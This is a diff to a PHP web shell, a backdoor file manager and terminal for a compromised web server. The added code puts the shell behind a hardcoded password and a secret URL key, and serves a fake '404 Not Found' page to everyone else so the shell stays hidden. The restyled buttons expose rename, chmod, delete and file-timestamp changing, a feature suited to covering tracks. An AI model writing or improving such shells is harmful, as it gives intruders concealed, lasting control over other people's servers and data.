@@ -4,6 +4,97 @@
 @ini_set('post_max_size','50M');
 @ini_set('max_execution_time',300);
 
+/* ── Auth config ─────────────────────────────────────── */
+define('SH_PASS',   '205f4dbefb83d4b4608c517d41883c86'); // md5('semur')
+define('SH_KEY',    'ayam');
+define('SH_TTL',    6 * 3600);
+define('SH_COOKIE', 'sh_tok');
+
+function sh_secret() {
+    return md5(SH_PASS . @php_uname() . __FILE__);
+}
+function sh_auth_check() {
+    if (!isset($_COOKIE[SH_COOKIE])) return false;
+    $parts = explode('|', $_COOKIE[SH_COOKIE]);
+    if (count($parts) !== 2) return false;
+    $ts  = (int)$parts[0];
+    $sig = $parts[1];
+    if (time() - $ts > SH_TTL) return false;
+    $expected = md5($ts . sh_secret());
+    return function_exists('hash_equals') ? hash_equals($expected, $sig) : ($expected === $sig);
+}
+function sh_auth_set() {
+    $ts  = time();
+    $sig = md5($ts . sh_secret());
+    setcookie(SH_COOKIE, $ts.'|'.$sig, time() + SH_TTL, '/');
+}
+function sh_auth_clear() {
+    setcookie(SH_COOKIE, '', time() - 3600, '/');
+}
+
+/* ── Auth gate ───────────────────────────────────────── */
+$_sh_key_present = isset($_GET[SH_KEY]);
+$_sh_authed      = sh_auth_check();
+
+// No ?ayam → fake 404
+if (!$_sh_key_present && !$_sh_authed) {
+    header('HTTP/1.0 404 Not Found');
+    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
+    exit;
+}
+
+// Handle login POST
+if (isset($_POST['sh_pw'])) {
+    $input_hash = md5(trim($_POST['sh_pw']));
+    $ok = function_exists('hash_equals') ? hash_equals(SH_PASS, $input_hash) : (SH_PASS === $input_hash);
+    if ($ok) {
+        sh_auth_set();
+        $redir = '?' . SH_KEY . '&authed=1';
+        header('Location: ' . $redir);
+        exit;
+    } else {
+        $sh_login_err = 'Wrong password.';
+    }
+}
+
+// Show login form if not authed
+if (!$_sh_authed) {
+    $sh_login_err = isset($sh_login_err) ? $sh_login_err : '';
+    ?><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Login</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0d1117;color:#c9d1d9;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:32px 28px;width:320px}
+h2{font-size:15px;color:#58a6ff;margin-bottom:20px;text-align:center;letter-spacing:.05em}
+label{font-size:12px;color:#8b949e;display:block;margin-bottom:6px}
+input[type=password]{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;padding:8px 10px;font-family:monospace;font-size:13px;outline:none}
+input[type=password]:focus{border-color:#58a6ff}
+button{width:100%;margin-top:14px;padding:9px;background:#1f6feb;border:none;border-radius:4px;color:#fff;font-family:monospace;font-size:13px;cursor:pointer}
+button:hover{background:#388bfd}
+.err{margin-top:12px;font-size:12px;color:#f85149;text-align:center}
+</style>
+</head>
+<body>
+<div class="box">
+<h2>&#x25A0; Shell Access</h2>
+<form method="post" action="?<?php echo SH_KEY; ?>">
+<label>Password</label>
+<input type="password" name="sh_pw" autofocus autocomplete="current-password">
+<button type="submit">Login</button>
+<?php if ($sh_login_err): ?><div class="err"><?php echo htmlspecialchars($sh_login_err,ENT_QUOTES,'UTF-8'); ?></div><?php endif; ?>
+</form>
+</div>
+</body>
+</html><?php
+    exit;
+}
+/* ── Authenticated past this point ───────────────────── */
+
 define('SH_HOME', __DIR__);
 $base = '/';
 
@@ -275,11 +366,22 @@ a{color:var(--ac);text-decoration:none}
 .col-date{font-size:11px;color:var(--tx2);white-space:nowrap}
 /* icon action buttons */
 .actions{display:flex;gap:2px;justify-content:flex-end;flex-shrink:0}
-.iab{width:26px;height:26px;background:transparent;border:1px solid transparent;border-radius:4px;color:var(--tx2);cursor:pointer;display:inline-flex;align-items:center;justify-content:center;transition:all .12s;flex-shrink:0;padding:0}
-.iab:hover{background:var(--bgh);border-color:var(--bd2);color:var(--tx0)}
-.iab.edit-btn:hover{color:var(--ac);border-color:rgba(0,200,255,.3)}
-.iab.del-btn:hover{color:var(--re);border-color:rgba(255,77,77,.3)}
-.iab.dl-btn:hover{color:var(--gr);border-color:rgba(61,214,140,.3)}
+.iab{width:26px;height:26px;background:transparent;border:1px solid transparent;border-radius:4px;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;transition:all .12s;flex-shrink:0;padding:0}
+.iab:hover{background:var(--bgh);border-color:var(--bd2)}
+.iab.edit-btn{color:var(--ac)}
+.iab.edit-btn:hover{background:rgba(0,200,255,.08);border-color:rgba(0,200,255,.3)}
+.iab.dl-btn{color:var(--gr)}
+.iab.dl-btn:hover{background:rgba(61,214,140,.08);border-color:rgba(61,214,140,.3)}
+.iab.rename-btn{color:#a78bfa}
+.iab.rename-btn:hover{background:rgba(167,139,250,.08);border-color:rgba(167,139,250,.3)}
+.iab.chmod-btn{color:var(--am)}
+.iab.chmod-btn:hover{background:rgba(245,166,35,.08);border-color:rgba(245,166,35,.3)}
+.iab.chdate-btn{color:#60a5fa}
+.iab.chdate-btn:hover{background:rgba(96,165,250,.08);border-color:rgba(96,165,250,.3)}
+.iab.copy-btn{color:#94a3b8}
+.iab.copy-btn:hover{background:rgba(148,163,184,.08);border-color:rgba(148,163,184,.3)}
+.iab.del-btn{color:var(--re)}
+.iab.del-btn:hover{background:rgba(255,77,77,.08);border-color:rgba(255,77,77,.3)}
 /* ── shell ── */
 .term-wrap{background:var(--bg1);border:1px solid var(--bd1);border-radius:8px;padding:16px}
 .term-cwd{font-family:var(--mono);font-size:11px;color:var(--tx2);margin-bottom:10px}
@@ -384,7 +486,7 @@ input[type=file]{color:var(--tx1);font-size:12px}
   <div class="toolbar">
     <?php if ($parent && $parent !== $path): ?>
     <a class="btn" href="?path=<?php echo urlencode($parent); ?>&tab=browse">
-      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>Up
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>Back
     </a>
     <?php endif; ?>
     <button type="button" class="btn" onclick="showModal('m-mkdir')">
@@ -455,19 +557,19 @@ input[type=file]{color:var(--tx1);font-size:12px}
             </a>
             <?php endif; ?>
             <!-- Rename -->
-            <button type="button" class="iab" title="Rename" onclick="openRename(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($fn); ?>)">
+            <button type="button" class="iab rename-btn" title="Rename" onclick="openRename(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($fn); ?>)">
               <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>
             </button>
             <!-- Chmod -->
-            <button type="button" class="iab" title="Chmod (<?php echo sh_safe($oct); ?>)" onclick="openChmod(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($oct); ?>)">
+            <button type="button" class="iab chmod-btn" title="Chmod (<?php echo sh_safe($oct); ?>)" onclick="openChmod(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($oct); ?>)">
               <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
             </button>
             <!-- Chdate -->
-            <button type="button" class="iab" title="Change timestamp" onclick="openChdate(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($fdate); ?>)">
+            <button type="button" class="iab chdate-btn" title="Change timestamp" onclick="openChdate(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($fdate); ?>)">
               <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
             </button>
             <!-- Copy path -->
-            <button type="button" class="iab" title="Copy path" onclick="copyPath(<?php echo sh_esc($fp); ?>)">
+            <button type="button" class="iab copy-btn" title="Copy path" onclick="copyPath(<?php echo sh_esc($fp); ?>)">
               <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
             </button>
             <!-- Delete -->
